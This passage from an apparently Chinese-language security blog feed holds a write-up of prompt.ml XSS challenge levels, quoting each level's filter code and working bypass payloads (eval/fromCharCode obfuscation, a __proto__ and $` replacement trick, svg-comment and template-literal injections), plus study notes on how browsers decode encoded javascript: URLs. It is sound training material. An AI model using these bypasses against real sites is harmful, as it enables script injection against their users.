（已经足以完成挑战） 抛出 Welcome back, 函数未定义异常 抛出 in 操作符的 TypeError 异常 ⑤ HTML source12345&lt;script&gt; var data = &#123;"action":"login","message":"Welcome back, "(prompt(1))in"."&#125;; if (data.action === "login") document.write(data.message) &lt;/script&gt; ⑥ xss 类型 In Exception 的题型 0x0C toString 函数① JS 代码123456789function escape(input) &#123; // in Soviet Russia... input = encodeURIComponent(input).replace(/'/g, ''); // table flips you! input = input.replace(/prompt/g, 'alert'); // ノ┬─┬ノ ︵ ( \o°o)\ return '&lt;script&gt;' + input + '&lt;/script&gt; ';&#125; ② 题目分析 该题和 0x08 题目相似，但是仔细看却发现两个replace的位置有所改变，思路也有所改变。 ③ 相关知识点 parseInt() 和 toString() 函数的相关知识点； eval() 函数的相关知识点 String 的相关属性，比如fromCharCode() 和 concat() ④ payload12345payload1:eval(String.fromCharCode(112).concat(String.fromCharCode(114)).concat(String.fromCharCode(111)).concat(String.fromCharCode(109)).concat(String.fromCharCode(112)).concat(String.fromCharCode(116)).concat(String.fromCharCode(40)).concat(String.fromCharCode(49)).concat(String.fromCharCode(41)))payload2:eval((1558153217).toString(36).concat(String.fromCharCode(40)).concat(1).concat(String.fromCharCode(41)))payload3:prompt(eval((630038579).toString(30))(1)) 第一个 payload 是 0x08 题目的一个 payload，在这道题也照样能用。 在 JS 中存在一个函数 parseInt(str, radix) ，默认情况下，radix = 10，即它可以把十进制的数字字符串转换成十进制数。但是通过调整进制数 radix ，它可以把其他进制的字符串转换成十进制数。而当 radix = 36 时。它可以把只包含 0-9a-z （大小写不敏感）的字符串转换成十进制数。于是我们可以把 prompt 字符串转换成十进制数：parseInt(&quot;prompt&quot;, 36) ，得到 1558153217，而要将十进制数字还原成字符串，则可以使用另一个函数 toString(radix) （默认情况下 radix = 10 ）。 第二个payload是用toString函数简化后的payload，第三个是一个更简化的，因为没有必要对(1) 绕过。 ⑤ HTML source1&lt;script&gt;alert(eval((630038579).toString(30))(1))&lt;/script&gt; ⑥ xss 类型 编码绕过问题。 0x0D JSON Object① JS 代码123456789101112131415161718192021222324252627282930313233 function escape(input) &#123; // extend method from Underscore library // _.extend(destination, *sources) function extend(obj) &#123; var source, prop; for (var i = 1, length = arguments.length; i &lt; length; i++) &#123; source = arguments[i]; for (prop in source) &#123; obj[prop] = source[prop]; &#125; &#125; return obj; &#125; // a simple picture plugin try &#123; // pass in something like &#123;"source":"http://sandbox.prompt.ml/PROMPT.JPG"&#125; var data = JSON.parse(input); var config = extend(&#123; // default image source source: 'http://placehold.it/350x150' &#125;, JSON.parse(input)); // forbit invalid image source if (/[^\w:\/.]/.test(config.source)) &#123; delete config.source; &#125; // purify the source by stripping off " var source = config.source.replace(/"/g, ''); // insert the content using mustache-ish template return '&lt;img src="&#123;&#123;source&#125;&#125;"&gt;'.replace('&#123;&#123;source&#125;&#125;', source); &#125; catch (e) &#123; return 'Invalid image data.'; &#125;&#125; ② 题目分析 这道题目的代码较多，在这里需要对代码仔细的分析一下： 12345var data = JSON.parse(input); var config = extend(&#123; // default image source source: 'http://placehold.it/350x150' &#125;, JSON.parse(input)); 上面的代码要求我们输入的格式必须是 JSON 格式，然后 input 会与一个固定的 JSON { &#39;source&#39; : &#39;http://placehold.it/350x150&#39; } 执行 extend 操作。处理后的 input JSON 对象存储到 config 变量中。 12345678910111213function escape(input) &#123; // extend method from Underscore library // _.extend(destination, *sources) function extend(obj) &#123; var source, prop; for (var i = 1, length = arguments.length; i &lt; length; i++) &#123; source = arguments[i]; for (prop in source) &#123; obj[prop] = source[prop]; &#125; &#125; return obj; &#125; 检测 input 的 JSON 顶层是否具有属性 source ，若有则不对 input 做任何修改。否则则在 input 的 JSON 顶层 添加属性 source ，且取默认值为 http://placehold.it/350x150 。实际上这个函数是没什么用的。 1234// forbit invalid image source if (/[^\w:\/.]/.test(config.source)) &#123; delete config.source; &#125; 继而利用 test 函数正则校验 config JSON 对象的顶层属性 source 的值，若其值含有 0-9、 a-z、 A-Z、 _、 :、 /、 .、 以外的字符，则删除 source 属性。换言之这里是避免我们在顶层属性 source 编写 payload 。 12// purify the source by stripping off "var source = config.source.replace(/"/g, ''); 即使 config JSON 对象的顶层属性 source 得以保留，也会把其中的双引号 &quot; 全部过滤。 换言之这行代码是避免我们闭合 JSON 属性。 12// insert the content using mustache-ish templatereturn '&lt;img src="&#123;&#123;source&#125;&#125;"&gt;'.replace('&#123;&#123;source&#125;&#125;', source); 最后把 source 的值作为 img 标签的 src 属性值输出到前端。 ③ 相关知识点 相当难的一道综合题型，考察对 Javascript 原理的理解程度，相关知识点如下： Object getter/setter 访问器（accessor）：Object.prototype.__proto_ String 正则替换：String.prototype.replace() 标签 &lt;img&gt; 的构造 xss 的常用方法 String 其他的属性 ④ payload1&#123;"source": "--EXP : Delete Me--", "__proto__": &#123;"source": "$` onerror=prompt(1) &gt;"&#125;&#125; 因为代码太过于长，于是我打算先按照格式输入进去，看看 HTML source 的结果： 1&lt;img src="http://sandbox.prompt.ml/PROMPT.JPG"&gt; 原来 source 的值是 src 属性的值，对 &lt;img&gt; 标签来说，正常情况注入 JS，可以通过两个方式： src = x onerror = prompt(1)：通过加载图片的错误，调用 onerror 事件； 对于这种放法，因为双引号 &quot; 被过滤了，我们无法通过闭合 src 的双引号再增加 onerror 属性。src = &quot;onerror = prompt(1)&quot;，但是根据 JS 的 replace(&#39;_posts/2020.02.27（96）.md&#39;, source) 函数的语法，第二个由我们控制的参数 source 是可以插入特殊变量名以达到某些效果的（详见 这里 ）。而我们要使用的特殊变量名，就是 $`，这个变量名的效果是插入当前匹配的子串左边的内容。就这题而言，因为 &#39;.replace(&#39;_posts/2020.02.27（96）.md&#39;, source) 第一个参数 _posts/2020.02.27（96）.md 匹配了原字符串，而所匹配部分的左边内容是 &lt;img src=&quot;，因此若第二个参数 source 含有特殊变量，就会把 &lt;img src=&quot;插入到该特殊变量位置。 注意所插入的到 &lt;img src=&quot;最右侧刚好有一个双引号，那么我们就可以用来闭合 src 属性的双引号了。于是我们可以构造 source 的值为 1$` onerror=prompt(1) &gt; 当特殊变量被替换后，实际就等价于 ，再将其通过replace替换到原串的_posts/2020.02.27（96）.md` ，就可以得到： 1&lt;img src="&lt;img src=" onerror=prompt(1) &gt;"&gt; 即 src 属性值等于 &quot; ，被成功闭合了，同时因为是一个无效值，会触发到onerror` 的 JS 。 那么接下来的问题就是，怎么保留我们所构造的 source 值到最后。 根据前面的分析知道， source 值就是源于我们输入的 json 的 source 属性值。 但是在此之前有这样的一段 test 代码，当 source 值含有 0-9、 a-z、 A-Z、 _、 :、 /、 .、 以外的字符，则删除 json 的 source 属性： 1234// forbit invalid image sourceif (/[^\w:\/.]/.test(config.source)) &#123; delete config.source;&#125; 很不幸地，我们构造的 source 值是满足删除标准的。换言之，若直接 input 的 JSON 如下，是无法把 source 属性值保留到最后的： 1&#123; "source" : "$` onerror=prompt(1)" &#125; 最直接的想法是，能不能在 JSON 构造两个 source 属性骗过正则校验，使得其中一个没用的 source 被删除，而我们构造的 source 则得以保留。不过问题是，JSON 是具备 hash 特性的，若直接在同级构造两个同名属性 source ，后者是会覆盖前者的。不过也并非一无所获，从控制台里面注意到，所构造的 JSON 对象具有一个隐藏属性 __proto__ 。特意去查了一下这个属性的作用（详见 这里），得知在 JS 代码中，每个 JSON 对象都具有一个隐藏属性 __proto__ ，而这个属性本质上是一个访问器，其作用是当我们需要访问 JSON 对象中的某个属性值时，可以提供类似于 getter / setter 访问方法的语法糖。 例如若在 JS 代码中定义一个这样的 JSON 变量 var json = {&quot;source&quot;: &quot;exp&quot;} ： 当需要访问 source 的属性值时，如： var src = json.source ，实际上是 __proto__ 的 getter 在起作用 当需要修改 source 的属性值时，如： json.source = &quot;EXP&quot; ，实际上是 __proto__ 的 setter 在起作用 虽然 __proto__ 是一个访问器，不过默认情况下，我们是不可以 json.__proto__.source 这样访问属性的。但有趣的是，假如在 JSON 中显式设置了 __proto__ 属性，例如这样：{&quot;__proto__&quot;: {&quot;source&quot;: &quot;exp&quot;}}那么就会给 JS 解析器造成某些“混乱”，使得诸如 json.__proto__.source 的访问属性方式变成可能。不但如此，此时 JSON 还同时支持 json.source 和 json.__proto__.source 两种访问属性方式，且他们是等价的。利用这个特点，我们就可以在 JSON 的同级构造两个同名属性。 例如在 JS 中定义这样的一个 JSON 变量 var json = {&quot;source&quot;: &quot;EXP&quot;, &quot;__proto__&quot;: {&quot;source&quot;: &quot;M02&quot;}}。 当 &quot;source&quot;: &quot;EXP&quot; 属性存在时： json.source 会优先得到 EXP 的值 json.__proto__.source 会得到全路径 M02 的值 当 &quot;source&quot;: &quot;EXP&quot; 属性不存在时： json.source 会通过 __proto__ 访问器得到 M02 的值 json.__proto__.source 依旧会得到全路径 M02 的值 回到这题，我们可以利用这个 JSON 特性进行欺骗，在 input 构造一个类似这样的 JSON ： 12&gt; &#123;"source": "--delete me--", "__proto__": &#123;"source": "payload"&#125;&#125;&gt; &gt; 其中第一个 source 只需要满足代码中 test 的正则条件使之被删除即可，这样第二个用于 payload 的 source 则可以保留到最后。最终构造出 payload。 src = &quot;URI&quot; onload = prompt(1)：通过成功加载图片，调用 onload 事件； 无 ⑤ HTML source1&lt;img src="&lt;img src=" onerror=prompt(1) &gt;"&gt; ⑥ xss 类型 这是一到综合性较大的题目，涉及的知识点有如此之多，需要好好再看看。 0x0E BASE 64① JS 代码12345678910111213function escape(input) &#123; // I expect this one will have other solutions, so be creative :) // mspaint makes all file names in all-caps :( // too lazy to convert them back in lower case // sample input: prompt.jpg =&gt; PROMPT.JPG input = input.toUpperCase(); // only allows images loaded from own host or data URI scheme input = input.replace(/\/\/|\w+:/g, 'data:'); // miscellaneous filtering input = input.replace(/[\\&amp;+%\s]|vbs/gi, '_'); return '&lt;img src="' + input + '"&gt;';&#125; ② 题目分析 在这里我转载一篇文章https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/prompt/Level%2014%20-%20Base64 ③ 相关知识点 Data URI Scheme： Data URIs 被浏览器严格限制，导致在 HTML 标签中，能够使用 Data URIs 的标签极其有限。 &lt;img&gt; 标签的 src 属性 &lt;object&gt; 标签的 data 属性 &lt;iframe&gt; 标签的 src 属性 &lt;a&gt; 标签的 href 属性 Base64 编码原理 相对协议地址 Unicode 字符编码 &lt;script&gt; 异步执行属性 async ④ payload 参考转载的文章 ⑤ HTML source 参考转载的文章 ⑥ xss 类型 date URI 方案和 base64 的结合应用 0x0F Length2① JS 代码1234567891011function escape(input) &#123; // sort of spoiler of level 7 input = input.replace(/\*/g, ''); // pass in something like dog#cat#bird#mouse... var segments = input.split('#'); return segments.map(function(title, index) &#123; // title can only contain 15 characters return '&lt;p class="comment" title="' + title.slice(0, 15) + '" data-comment=\'&#123;"id":' + index + '&#125;\'&gt;&lt;/p&gt;'; &#125;).join('\n');&#125; ② 题目分析 这道题和 0x07 题目很像，但是这道题目将 * 进行了过滤，但是长度比那道题目多了一些。 ③ 相关知识点 &lt;svg&gt; ：在默认 HTML 语境下， HTML 注释是没办法在 JS 代码中使用的，但是可以借助 &lt;svg&gt; 标签强制解析 XML 语法的特点：在 &lt;svg&gt; 标签中若包含 JS 代码，即使使用 HTML 注释 &lt;!-- --&gt; 也是可以被成功解析的。例如： 123456789&lt;svg&gt; &lt;!-- xxxx --&gt; &lt;script&gt; &lt;!-- yyyy --&gt; alert(1) &lt;!-- zzzz --&gt; alert(2) &lt;/script&gt;&lt;/svg&gt; 模板字符串 ：在 JS 中，可以使用 倒引号（或反引号）包围字符串，字符串中再以 ${expression} 方式入表达式，这样表达式就会被执行，例如： 123&lt;script&gt; `&lt;a="1" b='2'&gt; $&#123;prompt(1)&#125; by exp`&lt;/script&gt; ④ payload12payload1:"&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1&lt;!--#--&gt;)&lt;/script&gt;payload2:"&gt;&lt;script&gt;`#$&#123;prompt(1)&#125;#`&lt;/script&gt; 第一个是根据 &lt;svg&gt; 注释的知识点构造的，但是需要注意的是 &lt;script&gt; 和 &lt;/script&gt; 标签用于声明 js 代码的范围，这两个标签不能从中间任何位置破开到两行，否则多行注释 &lt;!-- --&gt; 就不会起作用了。 ⑤ HTML source1234567891011payload1:&lt;p class="comment" title=""&gt;&lt;svg&gt;&lt;!--" data-comment='&#123;"id":0&#125;'&gt;&lt;/p&gt;&lt;p class="comment" title="--&gt;&lt;script&gt;&lt;!--" data-comment='&#123;"id":1&#125;'&gt;&lt;/p&gt;&lt;p class="comment" title="--&gt;prompt(1&lt;!--" data-comment='&#123;"id":2&#125;'&gt;&lt;/p&gt;&lt;p class="comment" title="--&gt;)&lt;/script&gt;" data-comment='&#123;"id":3&#125;'&gt;&lt;/p&gt;======================================================================payload2:&lt;p class="comment" title=""&gt;&lt;script&gt;`" data-comment='&#123;"id":0&#125;'&gt;&lt;/p&gt;&lt;p class="comment" title="$&#123;prompt(1)&#125;" data-comment='&#123;"id":1&#125;'&gt;&lt;/p&gt;&lt;p class="comment" title="`&lt;/script&gt;" data-comment='&#123;"id":2&#125;'&gt;&lt;/p&gt; ⑥ xss 类型 注释问题]]></content>
      <tags>
        <tag>web</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【知识点整理】浏览器解析：HTML解析_JS解析_URL解析]]></title>
    <url>%2F2020%2F02%2F24%2F2020.02.24%EF%BC%8895%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、判断下列语句能否成功执行12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091Basics0x01. &lt;a href="%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29"&gt;&lt;/a&gt;// URL encoded "javascript:alert(1)"// Answer: The javascript will NOT execute.0x02. &lt;a href="&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29"&gt;// Character entity encoded "javascript" and URL encoded "alert(2)"// Answer: The javascript will execute.0x03. &lt;a href="javascript%3aalert(3)"&gt;&lt;/a&gt;// URL encoded ":"// Answer: The javascript will NOT execute.0x04. &lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;// Character entity encoded &lt; and &gt;// Answer: The javascript will NOT execute.0x05. &lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;// Character entity encoded &lt; and &gt;// Answer: The javascript will NOT execute AND the character entities will NOTbe decoded either0x06. &lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt;// Answer: The javascript will NOT execute.// Advanced0x07. &lt;button onclick="confirm('7&amp;#39;);"&gt;Button&lt;/button&gt;// Character entity encoded '// Answer: The javascript will execute.0x08. &lt;button onclick="confirm('8\u0027);"&gt;Button&lt;/button&gt;// Unicode escape sequence encoded '// Answer: The javascript will NOT execute.0x09. &lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;// Character entity encoded alert(9);// Answer: The javascript will NOT execute.0x0A. &lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;/script&gt;// Unicode Escape sequence encoded alert// Answer: The javascript will execute.0x0B. &lt;script&gt;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029&lt;/script&gt;// Unicode Escape sequence encoded alert(11)// Answer: The javascript will NOT execute.0x0C. &lt;script&gt;\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)&lt;/script&gt;// Unicode Escape sequence encoded alert and 12 // Answer: The javascript will NOT execute.0x0D. &lt;script&gt;alert('13\u0027)&lt;/script&gt;// Unicode escape sequence encoded '// Answer: The javascript will NOT execute.0x0E. &lt;script&gt;alert('14\u000a')&lt;/script&gt;// escape sequence encoded line feed.// Answer: The javascript will execute.Bonus0x0F. &lt;a href="&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;"&gt;&lt;/a&gt;// Answer: The javascript will execute. 二、相关知识0x01 HTML 解析 **浏览器最早开始解析HTML，将标签转化为内容树中的DOM 节点，此时识别标签的时候，HTML 解析器是无法识别那边被实体编码的内容的，即 HTML解析器 不会做解码的工作。** 只有建立起DOM 树，才能对每个节点的内容进行识别，这时候如果出现实体编码，则会进行实体解码。但是这时候解析出来假如有新的标签，那么不会在加入DOM树,只是作为字符串处理。比如&lt;textarea&gt;和&lt;title&gt;。 并且不是所有节点内容都会进行实体解码，比如&lt;script&gt; 和 &lt;style&gt; 里面的代码0x04。 以上对于标签的识别，并不只是标签头本身，也包括其中的属性、结构等。 小知识点： script标签内无法解析HTML实体编码，因为其不是在 data state 数据段内，SVG 属于支持 XML 解析，所以那么我们就很好理解了，因为下 xml 支持在标签内解析 HTML 实体字符，所以在 XML 中&#40;会被解析成（ 当HTML 解析器处于数据状态（DataState）、RCDATA 状态（RCDATA State）、属性值状态（Attribute Value State）时，字符实体会被解码为对应的字符。 在原始文本元素（&lt;script&gt; 和 &lt;style&gt;）类型标签下的所有字符实体编码都不会被 HTML 解码。 0x02 JavaScript 解析javascript解析器的入口： 标签 onlick 等事件 js 的动作 url 调用 javascript: 伪协议 css 调用引入文件，或 url 再间接引入 javascript: eval() 调用 定时器触发 Unicode转义序列出现的地方 从上下文来看，可以分为三个地方：字符串中，标识符名称中和控制字符（(,),;,”,’等）中。 字符串中：转义序列只会被解释为正规字符，而不是单引号，双引号或者换行符这些能够打破字符串上下文的字符。 标识符名称中：转义序列会被解码并解释为标识符名称的一部分，例如函数名，属性名等等。 控制字符中：转义序列将不会被解释成控制字符，而仅仅被解码并解析为标识符名称或者字符串常量。 JavaScript解析时只有标识符名称不会被当做字符串，控制字符仅会被解析为标示符名称或者字符串。 Javascript解析器工作的时候可以将\u0061\u006c\u0065\u0072\u0074进行js解码后为“alert”，而“alert”是一个有效的标识符名称，它是能被正常解析的。像圆括号、双引号、单引号等等这些控制字符，在进行JavaScript解析的时候仅会被解码为字符串文本或者上面讲的标识符名称，不能作为控制字符解析。 JavaScript 解析器[0x04] 形如 \uXXXX 这样的 Unicode 字符转义序列或 Hex 编码是否能被解码需要看情况。 首先，JavaScript 中有三个地方可以出现 Unicode 字符转义序列： 1、字符串中（in String） &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Unicode 转义序列出现在字符串中时，它只会被解释为普通字符，而不会破坏字符串的上下文。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;例如，&lt;script&gt;alert(“\u0031\u0030″);&lt;/script&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;被编码转义的部分为 10，是字符串，会被正常解码，JS 代码也会被执行。 2、标识符中（in identifier names） &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;若 Unicode 转义序列存在于标识符中，即变量名（如函数名等…），它会被进行解码。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;例如，&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;/script&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;被编码转义的部分为 alert 字符，是函数名，属于在标识符中的情况，因此会被正常解码，JS 代码也会被执行。 3、控制字符中（in control characters） &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;若 Unicode 转义序列存在于控制字符中，那么它会被解码但不会被解释为控制字符，而会被解释为标识符或字符串字符的一部分。 控制字符即’、”、()等。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;例如，&lt;script&gt;alert\u0028″xss”);&lt;/script&gt;，(进行了 Unicode 编码，那么解码后它不再是作为控制字符，而是作为标识符的一部分alert(。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因此函数的括号之类的控制字符进行 Unicode 转义后是不能被正常解释的。 例题 12345678&lt;a href="javascript:alert(1)")&gt;test&lt;/a&gt;&lt;a href="javascript:alert(\u0031)")&gt;test1&lt;/a&gt;&lt;a href="javascript:alert('\u0031')")&gt;test2&lt;/a&gt;&lt;a href="javascript:\u0061\u006c\u0065\u0072\u0074(1)")&gt;test3&lt;/a&gt;&lt;a href="javascript:\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029")&gt;test4&lt;/a&gt;&lt;a href="\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:alert(1)")&gt;test5&lt;/a&gt;&lt;a href="javascript\u003aalert(1)")&gt;test6&lt;/a&gt;&lt;a href="javascript:alert('1\u000a')")&gt;test7&lt;/a&gt; 测试 结果 test 弹框 test1 失败，解析为字符串1，需要单引号// 之所以添加单引号，是因为 JS 解码后的结果只能为子字符串或标识符 // test2 弹框，编码 ‘ 则失败 test3 弹框 test4 失败，编码括号 test5 失败，URL解码时，不以javascript伪协议解析，寻找根目录下链接 test6 失败，同上，寻找相对路径链接 test7 弹框，可以添加换行符，不受影响。\u000a：换行符 个人理解 javascript 解码后的结果是字符串或者是标识符名称， 控制符有 (、)、;、&quot; 和 &#39; 等 javascript 解码本质 **Unicode 序列不能出现在控制字符中，否则不能被解释。** 0x03 URL 解码 &lt;a href=&quot;%6A%61%76%61%73%63%72%69%70%74:%61%6C%65%72%74%28%31%29&quot;&gt;test1&lt;/a&gt; URL解析过程中的一个细节：**URL 不能对协议类型进行任何的编码操作**，否则URL解析器会认为它无类型，就导致上述被编码的“javascript”没有解码，当然不会被URL解析器识别了。 src 中是可以进行 URL 编码的，当输出环境在 href 或者 src 属性内时，可通过javascript 伪协议来执行 JS 代码 。 html中的 &lt;a&gt; 标签的 href 属性，url 解析器会对 href 内部的内容进行一次url解析，js中的window.open(),url解析器会对括号内部的内容进行一次url解析，URL解析过程中的一个细节了，不能对伪协议类型进行任何的编码操作，否则URL解析器会认为它无类型。这个协议类型的格式是javascript:不是只是javascript。除此了javascript:伪协议可以执行js代码之外，还有IE下的vbscript,Mozilla下的dataURL(data:text/html;这里可以直接添加html的&lt;script&gt;标签，会执行) 小知识点：URL 的格式 1完整的URI格式：[协议名]://[用户名]:[密码]@[主机名]:[端口]/[路径]?[查询参数]#[片段 ID] 首先，要注意的是 URL 的 Scheme 部分（协议部分）必须为 ASCII 字符，即不能被任何编码，否则 URL 解析器的状态机将进入 No Scheme 状态。 ▪ 示例1：&lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;URL 编码部分的是javascript:alert(1)，但是 JS 不会被执行，因为作为 Scheme 部分的”javascript”这个字符串被编码（其中javascript是一种伪协议），导致 URL 解析 器状态机进入 No Scheme 状态。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;URL 中的 : （冒号）也不能被以任何方式编码，否则 URL 解析器的状态机也将进入 No Scheme 状态。&lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt;由于 : (冒号)被 URL 编码为%3a，导致 URL 状态机进入 NoScheme 状态，JS 代码不能执行。 ▪ 示例2：&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;&lt;/a&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;“JavaScript” 这个字符串被实体化编码，: （冒号）没有被编码，alert(2) 被 URL编码，成功执行。首先，在 HTML 解析器中，HTML状态机处于属性值状态（Attribute Value State）时，字符实体时会被解码的，此处在 href 属性中，所以被实体化编码的 “javascript”字符串会被解码。其次，HTML 解析是在URL解析之前的，所以在进行 URL 解析之前，Scheme 部分的”javascript”字符串已被解码，而并不再是被实体编码的状态。 0x04 相关实践 三、详解每条原因0x01 1&lt;a href="%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29"&gt;&lt;/a&gt; 不能弹出。因为 “%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29” 是 URL 编码，在 HTML 解析上述语句所得到的还是该语句本身，而 URL 编码在编码 URL 时，要求 URL 的 Scheme 部分（协议部分）必须为 ASCII 字符，即不能被任何编码，否则 URL 解析器的状态机将进入 No Scheme 状态。所以作为Scheme 部分的 ”javascript” 这个字符串被编码（其中 javascript 是一种伪协议），导致 URL 解析器状态机进入 No Scheme 状态。 0x02 12&lt;a href="&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29"&gt; 能正常弹出。因为 &quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&quot; 是实体编码，所以在 HTML 解析器 解析后，上述实体编码被解码为 javascript，上述语句变为&lt;a href=&quot;JavaScript:%61%6c%65%72%74%28%32%29&quot;&gt;，这个时候 URL 解析器 遇见 javascript: 就会对后面的 URL 编码 解码，变为如下语句 &lt;a href=&quot;javascript:alert(1)&quot;&gt; ，所以成功弹窗。 0x03 1&lt;a href="javascript%3aalert(3)"&gt;&lt;/a&gt; 不能弹窗。虽然 JavaScript 没有被编码，但是 URL 解析器 在编码时是对 javascript: 识别状态，不是 javascript，所以 URL 解析器的状态机将进入 No Scheme 状态，所以不会弹窗。 0x04 1&lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt; 不能弹窗。 分析一：HTML 解析过程：一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个&#39;&lt;&#39;符号（后面没有跟&#39;/&#39;符号）就会进入“标签开始状态(Tag open state)”。然后转变到“标签名状态(Tag name state)”，“前属性名状态(before attribute name state)”......最后进入“数据状态(Data state)”并释放当前标签的token。当解析器处于“数据状态(Data state)”时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。这里有三种情况可以容纳字符实体，“数据状态中的字符引用”，“RCDATA 状态中的字符引用”和“属性值状态中的字符引用”。在这些状态中HTML字符实体将会从“&amp;#...”形式解码，对应的解码字符会被放入数据缓冲区中。在该问题中，“&lt;”和“&gt;”字符被编码为“&amp;#60;”和“\&amp;#62;”。当解析器解析完“&lt;div&gt;”并处于“数据状态”时，这两个字符将会被解析。当解析器遇到“&amp;”字符，它会知道这是“数据状态的字符引用”，因此会消耗一个字符引用（例如 “&amp;#60;” ）并释放出对应字符的 token。在这个例子中，对应字符指的是 “&lt;” 和 “&gt;” 。读者可能会想：这是不是意味着“&lt;”和“&gt;”的 token 将会被理解为标签的开始和结束，然后其中的脚本会被执行？答案是脚本并不会被执行。原因是解析器在解析这个字符引用后不会转换到“标签开始状态”。正因为如此，就不会建立新标签。因此，我们能够利用字符实体编码这个行为来转义用户输入的数据从而确保用户输入的数据只能被解析成 “数据”。 分析二：&lt;和&gt;被编码为字符实体&#60;和&#62;。 当 HTML 解析器解析完时，会进入数据状态（Data State）并发布标签令牌。接着解析到实体&#60;时因为处在数据状态（Data State）就会对实体进行解码为&lt;，后面 的&#62;同样道理被解码为&gt;。因为解析器在使用字符引用后不会转换到标签打开状态（Tag OpenState），不进入标签打开状态就不会被发布为 HTML 标签。因此，不会创建新 HTML 标签， 只会将其作为数据来处理。 这也是为什么我们可以使用字符实体来避免用户不安全输入导致 XSS 的原因。 0x05 1&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt; 不能弹窗，但是能够被解码。因为 textarea 和 title 标签名称是 RCDATA 元素[0x07]，但是处于 RCDATA State 状态时，字符实体是会被解析器解码的。所以上述的语句会被解码成下述语句 &lt;textarea&gt;&lt;script&gt;alert(5)&lt;/script&gt;&lt;/textarea&gt; ，但是里面的 JS 